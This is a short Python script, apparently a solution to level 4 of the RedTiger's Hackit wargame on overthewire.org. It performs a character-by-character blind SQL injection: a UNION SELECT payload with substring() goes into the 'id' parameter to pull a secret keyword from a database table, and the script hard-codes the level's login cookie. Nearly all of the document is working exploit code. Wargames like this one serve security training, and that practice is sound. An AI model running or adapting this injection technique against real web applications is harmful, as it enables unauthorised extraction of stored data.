# RedTiger's Hackit: Level 4
# woanmeo11

import requests, string

url = 'http://redtiger.labs.overthewire.org/level4.php'
cookies = {'level4login': 'put_the_kitten_on_your_head'}

result = ''

for i in range(21):
    for c in string.printable:
        payload = {'id': f"1 UNION SELECT keyword,2 FROM level4_secret WHERE substring(keyword,{i + 1},1)='{c}'"}
        response = requests.get(url, payload, cookies=cookies)
        print(c,end='',flush=True)
        if '2' in response.text:
            result += c
            break
    print()
    print(result)